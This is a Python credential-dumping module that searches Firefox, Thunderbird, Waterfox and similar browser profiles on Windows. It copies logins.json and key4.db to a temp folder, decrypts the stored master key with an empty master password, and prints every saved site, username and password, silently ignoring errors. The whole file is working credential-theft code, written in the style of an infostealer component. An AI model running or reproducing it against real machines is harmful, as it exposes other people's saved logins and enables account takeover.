
from base64 import b64decode
from shutil import copyfile
import os
import sqlite3
from ASN1 import ASN1
from Cryptodome.Hash import SHA1,SHA256
from Cryptodome.Protocol.KDF import PBKDF2
from Cryptodome.Cipher import AES,DES3
from Cryptodome.Util.Padding import unpad
import re

class Firefox(object):

    ffpswpaths = ["\\Mozilla\\Firefox", "\\Waterfox", "K-Meleon", "\\Thunderbird", "\\Comodo\\IceDragon", "\\8pecxstudios\\Cyberfox"] #
    tempdir = "C:\\temp\\Firefoxtemp\\"

    localappdata = os.environ["localappdata"] + "\\"

    passwdlist = []

    hostnameRe = b'''"hostname":"([^",]+)","'''
    usernameRe = b'''"encryptedUsername":"([^"]+)"'''
    passwdRe = b'''"encryptedPassword":"([^"]+)"'''

    def LoadKey4db(self, path) -> None:
        try:
            with sqlite3.connect(path) as conn:
                concur = conn.cursor()
                # password check
                res = concur.execute("SELECT item1, item2 FROM metaData WHERE id = 'password'").fetchall()[0]
                self.GlobalSalt = res[0]
                ASN1PassCheck = ASN1(res[1])
                self.CipherTextPasswordCheck = ASN1PassCheck.RootSequence["Sequence"][0]["OctetString"][0]
                self.EntrySaltPasswordCheck = ASN1PassCheck.RootSequence["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["OctetString"][0]
                self.IVCheck = ASN1PassCheck.RootSequence["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][1]["OctetString"][0]
                self.IterationCountCheck = ASN1PassCheck.RootSequence["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["Integer"][0][0]
                self.KeySizeCheck = ASN1PassCheck.RootSequence["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["Integer"][1][0]
                # master key
                res = concur.execute("SELECT a11 FROM nssPrivate").fetchall()[0][0]
                ASN1PassMasterK = ASN1(res)
                self.EntrySalt3DESKey = ASN1PassMasterK.RootSequence["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["OctetString"][0]
                self.IV3DESKey = ASN1PassMasterK.RootSequence["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][1]["OctetString"][0]
                self.CipherText3DESKey = ASN1PassMasterK.RootSequence["Sequence"][0]["OctetString"][0]
                self.IterationCount3DESKey = ASN1PassMasterK.RootSequence["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["Integer"][0][0]
                self.KeySize3DESKey = ASN1PassMasterK.RootSequence["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["Sequence"][0]["Integer"][1][0]
        except: pass

    def Decrypt3DES_MetaPBE(self, globalSalt:bytes, entrySalt:bytes, cipherText:bytes, IV:bytes, Itecnt:bytes, keysize:bytes, masterPassword:bytes) -> bytes:
        sha1 = SHA1.new()
        sha1.update(globalSalt)
        tempK = sha1.digest()

        key = PBKDF2(tempK, entrySalt, count=Itecnt, dkLen=keysize, hmac_hash_module=SHA256.new())
        ivv = b"\x04\x0e" + IV
        aes = AES.new(key, mode=AES.MODE_CBC, iv=ivv)
        return aes.decrypt(cipherText)

    def PasswordCheck(self, check:bytes):
        if b"password-check" in check:
            print("Password Check success!")
        else:
            print("Password Check FAILED...:(")

    def DecryptPasswdsCheck(self, key4db) -> None:
        self.LoadKey4db(key4db)
        DecryptedPasswordCheck = unpad(self.Decrypt3DES_MetaPBE(self.GlobalSalt, self.EntrySaltPasswordCheck, self.CipherTextPasswordCheck, self.IVCheck, self.IterationCountCheck, self.KeySizeCheck, b""), AES.block_size)
        self.PasswordCheck(DecryptedPasswordCheck)

    def DecryptEncryptedData(self, EncryptedData) -> bytes:
        Decrypted3DESKey = unpad(self.Decrypt3DES_MetaPBE(self.GlobalSalt, self.EntrySalt3DESKey, self.CipherText3DESKey, self.IV3DESKey, self.IterationCount3DESKey, self.KeySize3DESKey, b""), AES.block_size)
        try:
            encbytes = b64decode(EncryptedData)
            ASN1Passwd = ASN1(encbytes)
            passwdIV = ASN1Passwd.RootSequence["Sequence"][0]["Sequence"][0]["OctetString"][0]
            passwdEncrypted = ASN1Passwd.RootSequence["Sequence"][0]["OctetString"][1]
            des3 = DES3.new(Decrypted3DESKey, mode=DES3.MODE_CBC, iv=passwdIV)
            return unpad(des3.decrypt(passwdEncrypted), DES3.block_size)
        except: pass

    def DecryptPasswds(self, loginsjson) -> None:
        jsn = open(loginsjson, "rb").read()
        accounts = jsn.split(b"},")
        for account in accounts:
            hostname = re.search(self.hostnameRe, account, re.I)
            username = re.search(self.usernameRe, account, re.I)
            passwd = re.search(self.passwdRe, account, re.I)
            if hostname:
                hostname = self.DecryptEncryptedData(hostname.groups()[0])
            if username:
                username = self.DecryptEncryptedData(username.groups()[0])
            if passwd:
                passwd = self.DecryptEncryptedData(passwd.groups()[0])
            self.passwdlist.append([hostname, username, passwd])

    def FormatOutput(self)->None:
        print(" ====== Firefox password list : \n")
        for x in self.passwdlist:
            print(x)

    def Run(self) -> None:
        if not os.path.exists(self.tempdir):
            os.makedirs(self.tempdir)
        ## test
        # self.DecryptPasswdsCheck(self.tempdir + "\\key4.db")
        # self.DecryptPasswds(self.tempdir + "\\logins.json")

        for p in self.ffpswpaths:
            prf = self.localappdata + p + "\\Profiles\\"
            if not os.path.exists(prf):
                continue
            for usr in os.listdir(prf):
                if not os.path.exists(prf + usr):
                    continue
                try:
                    copyfile(prf+usr+"\\logins.json", self.tempdir+"\\logins.json")
                    copyfile(prf+usr+"\\key4.db", self.tempdir+"\\key4.db")
                    self.DecryptPasswdsCheck(self.tempdir+"\\key4.db")
                    self.DecryptPasswds(self.tempdir+"\\logins.json")
                except: pass

        self.FormatOutput()
